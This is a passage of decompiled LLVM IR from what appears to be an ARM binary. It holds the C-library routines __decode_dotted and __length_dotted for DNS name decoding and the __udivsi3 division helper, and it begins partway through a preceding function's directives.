  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_12628, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1261c, { 1, 0 }
  uselistorder label %dec_label_pc_125d0, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_12644 = load i32, i32* @r4, align 4
  %v6_12644 = load i32, i32* @r5, align 4
  %v0_12648 = load i32, i32* @r0, align 4
  store i32 %v0_12648, i32* %sl.global-to-local, align 4
  %v2_12648 = icmp eq i32 %v0_12648, 0
  br i1 %v2_12648, label %.thread16, label %dec_label_pc_126e8.preheader

.thread16:                                        ; preds = %entry
  %v0_126541 = load i32, i32* @r2, align 4
  store i32 %v0_126541, i32* %sb.global-to-local, align 4
  %v0_126582 = load i32, i32* @r3, align 4
  store i32 %v0_126582, i32* %stack_var_-40, align 4
  br label %dec_label_pc_12708

dec_label_pc_126e8.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_12654 = load i32, i32* @r2, align 4
  store i32 %v0_12654, i32* %sb.global-to-local, align 4
  %v0_12658 = load i32, i32* @r3, align 4
  store i32 %v0_12658, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_126e83952 = load i32, i32* @r1, align 4
  %v2_126e84053 = add i32 %v1_126e83952, %v0_12648
  %v3_126e84154 = inttoptr i32 %v2_126e84053 to i8*
  %v4_126e84255 = load i8, i8* %v3_126e84154, align 1
  %v6_126e84356 = zext i8 %v4_126e84255 to i32
  store i32 %v6_126e84356, i32* @r4, align 4
  %v2_126ec4457 = icmp eq i8 %v4_126e84255, 0
  br i1 %v2_126ec4457, label %bb35, label %dec_label_pc_1266c.lr.ph

dec_label_pc_1266c:                               ; preds = %dec_label_pc_1266c.lr.ph, %bb30
  %v2_126f450 = phi i1 [ %v2_126f44663, %dec_label_pc_1266c.lr.ph ], [ true, %bb30 ]
  %v6_126e848 = phi i32 [ %v6_126e84361, %dec_label_pc_1266c.lr.ph ], [ %v6_126e8, %bb30 ]
  %v1_126e847 = phi i32 [ %v1_126e83960, %dec_label_pc_1266c.lr.ph ], [ %v5_12694, %bb30 ]
  %v1_12670 = and i32 %v6_126e848, 192
  br i1 %v2_126f450, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_1266c
  %v1_12674 = load i32, i32* %r8.global-to-local, align 4
  %v2_12674 = add i32 %v1_12674, 1
  store i32 %v2_12674, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_1266c, %bb
  %v2_12678 = icmp eq i32 %v1_12670, 192
  %v1_1267c = add i32 %v1_126e847, 1
  store i32 %v1_1267c, i32* @r5, align 4
  br i1 %v2_12678, label %dec_label_pc_12684, label %dec_label_pc_126a4

dec_label_pc_12684:                               ; preds = %bb28
  %v2_12684 = add i32 %v1_1267c, %v0_12684.ph59
  %v3_12684 = inttoptr i32 %v2_12684 to i8*
  %v4_12684 = load i8, i8* %v3_12684, align 1
  %v6_12684 = zext i8 %v4_12684 to i32
  %v1_1268c = urem i32 %v6_126e848, 64
  br i1 %v2_126f450, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_12684
  %v1_12690 = load i32, i32* %r8.global-to-local, align 4
  %v2_12690 = add i32 %v1_12690, 1
  store i32 %v2_12690, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_12684, %bb29
  %v4_12694 = mul nuw nsw i32 %v1_1268c, 256
  %v5_12694 = or i32 %v6_12684, %v4_12694
  store i32 %v5_12694, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_126e8 = add i32 %v5_12694, %v0_12684.ph59
  %v3_126e8 = inttoptr i32 %v2_126e8 to i8*
  %v4_126e8 = load i8, i8* %v3_126e8, align 1
  %v6_126e8 = zext i8 %v4_126e8 to i32
  store i32 %v6_126e8, i32* @r4, align 4
  %v2_126ec = icmp eq i8 %v4_126e8, 0
  br i1 %v2_126ec, label %dec_label_pc_126f4.bb36_crit_edge, label %dec_label_pc_1266c

dec_label_pc_126a4:                               ; preds = %bb28
  %v2_126a4 = add i32 %v6_126e848, %storemerge17.ph58
  store i32 %v2_126a4, i32* %r6.global-to-local, align 4
  %v2_126a8 = load i32, i32* %stack_var_-40, align 4
  %v1_126ac = add i32 %v2_126a4, 1
  store i32 %v1_126ac, i32* %r7.global-to-local, align 4
  %v3_126b0 = icmp ult i32 %v1_126ac, %v2_126a8
  br i1 %v3_126b0, label %dec_label_pc_126b8, label %dec_label_pc_12708

dec_label_pc_126b8:                               ; preds = %dec_label_pc_126a4
  %v2_126b8 = add i32 %v1_1267c, %v0_12684.ph59
  store i32 %v2_126b8, i32* @r1, align 4
  %v0_126bc = load i32, i32* %sb.global-to-local, align 4
  %v2_126bc = add i32 %v0_126bc, %storemerge17.ph58
  store i32 %v2_126bc, i32* @r0, align 4
  store i32 %v6_126e848, i32* @r2, align 4
  %v0_126c4 = call i32 @memcpy()
  %v0_126c8 = load i32, i32* @r5, align 4
  %v1_126c8 = load i32, i32* @r4, align 4
  %v2_126c8 = add i32 %v1_126c8, %v0_126c8
  store i32 %v2_126c8, i32* %r1.global-to-local, align 4
  %v0_126cc = load i32, i32* %sl.global-to-local, align 4
  %v2_126cc = add i32 %v0_126cc, %v2_126c8
  %v3_126cc = inttoptr i32 %v2_126cc to i8*
  %v4_126cc = load i8, i8* %v3_126cc, align 1
  %v0_126d0 = load i32, i32* %fp.global-to-local, align 4
  %v2_126d0 = icmp eq i32 %v0_126d0, 0
  br i1 %v2_126d0, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_126b8
  %v1_126d4 = load i32, i32* %r8.global-to-local, align 4
  %v3_126d4 = add i32 %v1_126d4, %v1_126c8
  store i32 %v3_126d4, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_126b8, %bb31
  %v2_126d8 = icmp eq i8 %v4_126cc, 0
  br i1 %v2_126d8, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_126e0.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_126e0 = load i32, i32* %sb.global-to-local, align 4
  %v3_126e0 = load i32, i32* %r6.global-to-local, align 4
  %v4_126e0 = add i32 %v3_126e0, %v2_126e0
  %v5_126e0 = inttoptr i32 %v4_126e0 to i8*
  store i8 %v0_126e0.off0, i8* %v5_126e0, align 1
  %v0_126e4.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_126e8.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_126f4.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_126e839 = load i32, i32* %r1.global-to-local, align 4
  %v2_126e840 = add i32 %v1_126e839, %v0_126e8.pre.pre
  %v3_126e841 = inttoptr i32 %v2_126e840 to i8*
  %v4_126e842 = load i8, i8* %v3_126e841, align 1
  %v6_126e843 = zext i8 %v4_126e842 to i32
  store i32 %v6_126e843, i32* @r4, align 4
  %v2_126ec44 = icmp eq i8 %v4_126e842, 0
  %v2_126f446 = icmp eq i32 %v0_126f4.pre.pre, 0
  br i1 %v2_126ec44, label %dec_label_pc_126f4, label %dec_label_pc_1266c.lr.ph

dec_label_pc_1266c.lr.ph:                         ; preds = %dec_label_pc_126e8.preheader, %bb34
  %v2_126f44663 = phi i1 [ %v2_126f446, %bb34 ], [ false, %dec_label_pc_126e8.preheader ]
  %v6_126e84361 = phi i32 [ %v6_126e843, %bb34 ], [ %v6_126e84356, %dec_label_pc_126e8.preheader ]
  %v1_126e83960 = phi i32 [ %v1_126e839, %bb34 ], [ %v1_126e83952, %dec_label_pc_126e8.preheader ]
  %v0_12684.ph59 = phi i32 [ %v0_126e8.pre.pre, %bb34 ], [ %v0_12648, %dec_label_pc_126e8.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_126e4.pre, %bb34 ], [ 0, %dec_label_pc_126e8.preheader ]
  br label %dec_label_pc_1266c

dec_label_pc_126f4:                               ; preds = %bb34
  br i1 %v2_126f446, label %dec_label_pc_126f4.bb36_crit_edge, label %bb35

dec_label_pc_126f4.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_126f4
  %v0_126fc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12708

bb35:                                             ; preds = %dec_label_pc_126e8.preheader, %dec_label_pc_126f4
  %v1_126f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_126f8 = add i32 %v1_126f8, 1
  store i32 %v2_126f8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12708

dec_label_pc_12708:                               ; preds = %dec_label_pc_126a4, %bb35, %dec_label_pc_126f4.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_126fc.pre, %dec_label_pc_126f4.bb36_crit_edge ], [ %v2_126f8, %bb35 ], [ -1, %dec_label_pc_126a4 ]
  store i32 %v3_12644, i32* @r4, align 4
  store i32 %v6_12644, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_12684.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_126e8, { 1, 0 }
  uselistorder i32 %v5_12694, { 0, 2, 1 }
  uselistorder i32 %v6_126e848, { 2, 1, 0, 3 }
  uselistorder i1 %v2_126f450, { 1, 0 }
  uselistorder i32 %v0_12648, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 4, 1, 6, 2, 7, 3, 8, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i8 46, { 0, 2, 3, 1, 4 }
  uselistorder i32 ()* @memcpy, { 15, 14, 18, 13, 12, 11, 10, 3, 8, 7, 2, 1, 17, 9, 6, 5, 0, 19, 16, 4 }
  uselistorder i32 64, { 0, 3, 8, 9, 1, 10, 12, 6, 7, 11, 2, 4, 5 }
  uselistorder label %dec_label_pc_12708, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_126f4.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1266c.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_12714 = load i32, i32* @r0, align 4
  store i32 %v0_12714, i32* @lr, align 4
  %v2_12714 = icmp eq i32 %v0_12714, 0
  br i1 %v2_12714, label %bb, label %dec_label_pc_1272c

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_12724:                               ; preds = %dec_label_pc_12734
  %v1_12724 = add i32 %v1_1273c, 2
  br label %dec_label_pc_12754

dec_label_pc_1272c:                               ; preds = %entry
  %v0_1272c = load i32, i32* @r1, align 4
  br label %dec_label_pc_1273c

dec_label_pc_12734:                               ; preds = %dec_label_pc_1273c
  %v1_12748 = and i32 %v6_1273c, 192
  %v2_1274c = add i32 %v6_1273c, %v1_12740
  %v2_12734 = icmp eq i32 %v1_12748, 192
  br i1 %v2_12734, label %dec_label_pc_12724, label %dec_label_pc_1273c

dec_label_pc_1273c:                               ; preds = %dec_label_pc_12734, %dec_label_pc_1272c
  %v1_1273c = phi i32 [ %v2_1274c, %dec_label_pc_12734 ], [ %v0_1272c, %dec_label_pc_1272c ]
  %v2_1273c = add i32 %v1_1273c, %v0_12714
  %v3_1273c = inttoptr i32 %v2_1273c to i8*
  %v4_1273c = load i8, i8* %v3_1273c, align 1
  %v6_1273c = zext i8 %v4_1273c to i32
  %v1_12740 = add i32 %v1_1273c, 1
  %v2_12744 = icmp eq i8 %v4_1273c, 0
  br i1 %v2_12744, label %dec_label_pc_12754, label %dec_label_pc_12734

dec_label_pc_12754:                               ; preds = %dec_label_pc_1273c, %dec_label_pc_12724
  %v1_12754 = phi i32 [ %v1_12724, %dec_label_pc_12724 ], [ %v1_12740, %dec_label_pc_1273c ]
  %v2_12754 = sub i32 %v1_12754, %v0_1272c
  ret i32 %v2_12754

; uselistorder directives
  uselistorder i32 %v6_1273c, { 1, 0 }
  uselistorder i32 %v1_1273c, { 2, 1, 0 }
  uselistorder i32 %v0_12714, { 0, 2, 1 }
  uselistorder i8 0, { 53, 15, 22, 23, 54, 14, 19, 55, 24, 25, 26, 27, 28, 41, 59, 57, 40, 58, 56, 39, 34, 7, 8, 60, 61, 65, 66, 21, 50, 51, 62, 63, 64, 13, 67, 35, 42, 69, 68, 43, 36, 70, 71, 72, 73, 74, 75, 9, 46, 79, 0, 77, 76, 44, 1, 78, 45, 2, 80, 81, 29, 3, 83, 82, 47, 84, 85, 86, 87, 37, 88, 90, 91, 89, 10, 11, 12, 92, 4, 93, 94, 16, 52, 96, 97, 98, 99, 95, 38, 100, 101, 102, 103, 104, 17, 105, 106, 30, 20, 5, 6, 108, 107, 31, 109, 110, 32, 111, 48, 18, 112, 113, 114, 115, 118, 116, 117, 119, 120, 121, 122, 125, 124, 49, 123, 126, 127, 128, 129, 130, 131, 132, 134, 133, 33, 135, 136, 137 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1275c = add i32 %arg2, -1
  %v7_1275c = icmp eq i32 %arg2, 1
  br i1 %v7_1275c, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_12760 = load i32, i32* @r0, align 4
  ret i32 %v2_12760

bb80:                                             ; preds = %entry
  %v2_1275c = icmp eq i32 %arg2, 0
  br i1 %v2_1275c, label %dec_label_pc_12844, label %dec_label_pc_12768

dec_label_pc_12768:                               ; preds = %bb80
  %v0_12768 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_12768, %arg2
  br i1 %tmp, label %dec_label_pc_12770, label %dec_label_pc_127fc

dec_label_pc_12770:                               ; preds = %dec_label_pc_12768
  %v2_12770 = and i32 %v1_1275c, %arg2
  %v4_12770 = icmp eq i32 %v2_12770, 0
  br i1 %v4_12770, label %dec_label_pc_12808, label %dec_label_pc_12778

dec_label_pc_12778:                               ; preds = %dec_label_pc_12770
  %v3_12778 = icmp ult i32 %arg2, 536870912
  br i1 %v3_12778, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12778
  %v4_1277c = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12778, %.thread
  %v0_1279c.pr36.ph = phi i32 [ %v4_1277c, %.thread ], [ %arg2, %dec_label_pc_12778 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12778 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_1279c.pr36 = phi i32 [ %v4_12790, %bb83 ], [ %v0_1279c.pr36.ph, %.preheader.preheader ]
  %v1_12794 = phi i32 [ %v4_12794, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_12788 = icmp ugt i32 %v0_1279c.pr36, 268435455
  br i1 %v2_12788, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_1279cthread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_1278c = icmp ult i32 %v0_1279c.pr36, %v0_12768
  br i1 %v4_1278c, label %bb82, label %dec_label_pc_1279cthread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_12790 = and i32 %v0_1279c.pr36, 268435456
  %v3_12790 = icmp eq i32 %v2_12790, 0
  %v4_12790 = mul i32 %v0_1279c.pr36, 16
  br i1 %v3_12790, label %bb83, label %dec_label_pc_1279c.loopexit

bb83:                                             ; preds = %bb82
  %v2_12794 = and i32 %v1_12794, 268435456
  %v3_12794 = icmp eq i32 %v2_12794, 0
  %v4_12794 = mul i32 %v1_12794, 16
  br i1 %v3_12794, label %.preheader, label %dec_label_pc_1279cthread-pre-split.loopexit.loopexit

dec_label_pc_1279cthread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_127a848.ph = phi i32 [ %v1_12794, %bb81 ], [ %v4_12794, %bb83 ]
  %v0_1279c.pr38.ph = phi i32 [ %v0_1279c.pr36, %bb81 ], [ %v4_12790, %bb83 ]
  br label %dec_label_pc_1279cthread-pre-split.loopexit

dec_label_pc_1279cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1279cthread-pre-split.loopexit.loopexit, %.thread2
  %v1_127a848 = phi i32 [ %v1_12794, %.thread2 ], [ %v1_127a848.ph, %dec_label_pc_1279cthread-pre-split.loopexit.loopexit ]
  %v0_1279c.pr38 = phi i32 [ %v0_1279c.pr36, %.thread2 ], [ %v0_1279c.pr38.ph, %dec_label_pc_1279cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1279cthread-pre-split

dec_label_pc_1279cthread-pre-split:               ; preds = %dec_label_pc_1279cthread-pre-split.loopexit, %bb85
  %v1_127a846 = phi i32 [ %v1_127a848, %dec_label_pc_1279cthread-pre-split.loopexit ], [ %v3_127a8, %bb85 ]
  %v0_1279c.pr = phi i32 [ %v0_1279c.pr38, %dec_label_pc_1279cthread-pre-split.loopexit ], [ %v3_127a4, %bb85 ]
  br label %dec_label_pc_1279c

dec_label_pc_1279c.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_1279c

dec_label_pc_1279c:                               ; preds = %dec_label_pc_1279c.loopexit, %dec_label_pc_1279cthread-pre-split
  %v1_127a8 = phi i32 [ %v1_127a846, %dec_label_pc_1279cthread-pre-split ], [ %v1_12794, %dec_label_pc_1279c.loopexit ]
  %v1_127a4 = phi i32 [ %v0_1279c.pr, %dec_label_pc_1279cthread-pre-split ], [ %v4_12790, %dec_label_pc_1279c.loopexit ]
  %v2_1279c = icmp slt i32 %v1_127a4, 0
  br i1 %v2_1279c, label %dec_label_pc_127b0, label %bb84

bb84:                                             ; preds = %dec_label_pc_1279c
  %v4_127a0 = icmp ult i32 %v1_127a4, %v0_12768
  br i1 %v4_127a0, label %bb85, label %dec_label_pc_127b0

bb85:                                             ; preds = %bb84
  %v3_127a4 = mul i32 %v1_127a4, 2
  %v2_127a8 = icmp slt i32 %v1_127a8, 0
  %v3_127a8 = mul i32 %v1_127a8, 2
  br i1 %v2_127a8, label %dec_label_pc_127b0, label %dec_label_pc_1279cthread-pre-split

dec_label_pc_127b0:                               ; preds = %bb84, %dec_label_pc_1279c, %bb85
  %v2_127bc59 = phi i32 [ %v3_127a8, %bb85 ], [ %v1_127a8, %bb84 ], [ %v1_127a8, %dec_label_pc_1279c ]
  %v1_127b451 = phi i32 [ %v3_127a4, %bb85 ], [ %v1_127a4, %bb84 ], [ %v1_127a4, %dec_label_pc_1279c ]
  br label %dec_label_pc_127b4

dec_label_pc_127b4:                               ; preds = %.thread11, %dec_label_pc_127b0
  %v1_127e8 = phi i32 [ %v4_127e8, %.thread11 ], [ %v2_127bc59, %dec_label_pc_127b0 ]
  %v1_127bc = phi i32 [ %v0_127f4, %.thread11 ], [ 0, %dec_label_pc_127b0 ]
  %v1_127ec = phi i32 [ %v4_127ec, %.thread11 ], [ %v1_127b451, %dec_label_pc_127b0 ]
  %v1_127b8 = phi i32 [ %v0_127e4, %.thread11 ], [ %v0_12768, %dec_label_pc_127b0 ]
  %v3_127b4 = icmp ult i32 %v1_127b8, %v1_127ec
  br i1 %v3_127b4, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_127b4
  %v3_127b8 = sub i32 %v1_127b8, %v1_127ec
  %v3_127bc = or i32 %v1_127bc, %v1_127e8
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_127b4, %bb86
  %v1_127c4 = phi i32 [ %v1_127b8, %dec_label_pc_127b4 ], [ %v3_127b8, %bb86 ]
  %v1_127c8 = phi i32 [ %v1_127bc, %dec_label_pc_127b4 ], [ %v3_127bc, %bb86 ]
  %v4_127c0 = udiv i32 %v1_127ec, 2
  %v6_127c0 = icmp ult i32 %v1_127c4, %v4_127c0
  br i1 %v6_127c0, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_127c4 = urem i32 %v1_127ec, 2
  %v4_127c4 = icmp eq i32 %v3_127c4, 0
  %v6_127c4 = sub i32 %v1_127c4, %v4_127c0
  br i1 %v4_127c4, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_127c8 = udiv i32 %v1_127e8, 2
  %v6_127c8 = or i32 %v1_127c8, %v5_127c8
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_127d0 = phi i32 [ %v6_127c4, %bb87 ], [ %v1_127c4, %.thread7 ], [ %v6_127c4, %bb88 ]
  %v1_127d4 = phi i32 [ %v1_127c8, %bb87 ], [ %v1_127c8, %.thread7 ], [ %v6_127c8, %bb88 ]
  %v4_127cc = udiv i32 %v1_127ec, 4
  %v6_127cc = icmp ult i32 %v1_127d0, %v4_127cc
  br i1 %v6_127cc, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_127d0 = and i32 %v1_127ec, 2
  %v4_127d0 = icmp eq i32 %v3_127d0, 0
  %v6_127d0 = sub i32 %v1_127d0, %v4_127cc
  br i1 %v4_127d0, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_127d4 = udiv i32 %v1_127e8, 4
  %v6_127d4 = or i32 %v1_127d4, %v5_127d4
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_127dc = phi i32 [ %v6_127d0, %bb89 ], [ %v1_127d0, %.thread8 ], [ %v6_127d0, %bb90 ]
  %v1_127e0 = phi i32 [ %v1_127d4, %bb89 ], [ %v1_127d4, %.thread8 ], [ %v6_127d4, %bb90 ]
  %v4_127d8 = udiv i32 %v1_127ec, 8
  %v6_127d8 = icmp ult i32 %v1_127dc, %v4_127d8
  br i1 %v6_127d8, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_127dc = and i32 %v1_127ec, 4
  %v4_127dc = icmp eq i32 %v3_127dc, 0
  %v6_127dc = sub i32 %v1_127dc, %v4_127d8
  br i1 %v4_127dc, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_127e0 = udiv i32 %v1_127e8, 8
  %v6_127e0 = or i32 %v1_127e0, %v5_127e0
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_127f4 = phi i32 [ %v1_127e0, %bb91 ], [ %v1_127e0, %.thread9 ], [ %v6_127e0, %bb92 ]
  %v0_127e4 = phi i32 [ %v6_127dc, %bb91 ], [ %v1_127dc, %.thread9 ], [ %v6_127dc, %bb92 ]
  %v2_127e4 = icmp eq i32 %v0_127e4, 0
  br i1 %v2_127e4, label %dec_label_pc_127f4, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_127e8, 16
  br i1 %tmp140, label %dec_label_pc_127f4, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_127e8 = udiv i32 %v1_127e8, 16
  %v4_127ec = udiv i32 %v1_127ec, 16
  br label %dec_label_pc_127b4

dec_label_pc_127f4:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_127f4

dec_label_pc_127fc:                               ; preds = %dec_label_pc_12768
  %v9_12768 = icmp eq i32 %v0_12768, %arg2
  %. = zext i1 %v9_12768 to i32
  ret i32 %.

dec_label_pc_12808:                               ; preds = %dec_label_pc_12770
  %v2_12808 = icmp ugt i32 %arg2, 65535
  br i1 %v2_12808, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_12808
  %v2_1280c = and i32 %arg2, 32768
  %v3_1280c = icmp eq i32 %v2_1280c, 0
  %v4_1280c = udiv i32 %arg2, 65536
  br i1 %v3_1280c, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_12808
  %v0_1281865 = phi i32 [ %arg2, %dec_label_pc_12808 ], [ %v4_1280c, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_1281c = phi i32 [ %v0_1281865, %.thread16 ], [ %v4_1280c, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_12818 = icmp ugt i32 %v1_1281c, 255
  br i1 %v2_12818, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_1281c = and i32 %v1_1281c, 128
  %v3_1281c = icmp eq i32 %v2_1281c, 0
  %v4_1281c = udiv i32 %v1_1281c, 256
  br i1 %v3_1281c, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_12820 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_1282c = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_12820, %bb100 ]
  %v1_12828 = phi i32 [ %v1_1281c, %bb98 ], [ %v4_1281c, %bb99 ], [ %v4_1281c, %bb100 ]
  %v2_12824 = icmp ugt i32 %v1_12828, 15
  br i1 %v2_12824, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_12828 = and i32 %v1_12828, 8
  %v3_12828 = icmp eq i32 %v2_12828, 0
  %v4_12828 = udiv i32 %v1_12828, 16
  br i1 %v3_12828, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_1282c = add nsw i32 %v1_1282c, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_12834 = phi i32 [ %v1_1282c, %.thread17 ], [ %v1_1282c, %bb101 ], [ %v2_1282c, %bb102 ]
  %v5_12838 = phi i32 [ %v1_12828, %.thread17 ], [ %v4_12828, %bb101 ], [ %v4_12828, %bb102 ]
  %v2_12830 = icmp ugt i32 %v5_12838, 3
  %v7_12830 = icmp eq i32 %v5_12838, 4
  %v2_12834 = xor i1 %v7_12830, true
  %v3_12834 = and i1 %v2_12830, %v2_12834
  br i1 %v3_12834, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_12834 = add nsw i32 %v4_12834, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_12838 = phi i32 [ %v4_12834, %.thread18 ], [ %v5_12834, %bb103 ]
  %v2_12838 = xor i1 %v2_12830, true
  %v3_12838 = or i1 %v7_12830, %v2_12838
  br i1 %v3_12838, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_12838 = udiv i32 %v5_12838, 2
  %v9_12838 = add i32 %v4_12838, %v8_12838
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_1283c = phi i32 [ %v4_12838, %bb104 ], [ %v9_12838, %bb105 ]
  %v6_1283c = lshr i32 %v0_12768, %v1_1283c
  ret i32 %v6_1283c

dec_label_pc_12844:                               ; preds = %bb80
  %v0_12844 = load i32, i32* @lr, align 4
  %v0_12848 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_12844)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12838, { 1, 0 }
  uselistorder i1 %v7_12830, { 1, 0 }
  uselistorder i32 %v4_12828, { 1, 0 }
  uselistorder i32 %v1_12828, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1281c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1281c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1280c, { 1, 0 }
  uselistorder i32 %v0_127e4, { 1, 0 }
  uselistorder i32 %v4_127d8, { 1, 0 }
  uselistorder i32 %v1_127e0, { 1, 2, 0 }
  uselistorder i32 %v4_127cc, { 1, 0 }
  uselistorder i32 %v1_127d4, { 1, 2, 0 }
  uselistorder i32 %v4_127c0, { 1, 0 }
  uselistorder i32 %v1_127c8, { 1, 2, 0 }
  uselistorder i32 %v1_127ec, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_127bc, { 1, 0 }
  uselistorder i32 %v1_127e8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_127a8, { 1, 0 }
  uselistorder i32 %v3_127a4, { 1, 0 }
  uselistorder i32 %v1_127a4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_127a8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12794, { 1, 0 }
  uselistorder i32 %v4_12790, { 2, 1, 0 }
  uselistorder i32 %v1_12794, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1279c.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_12768, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_127f4, { 1, 0 }
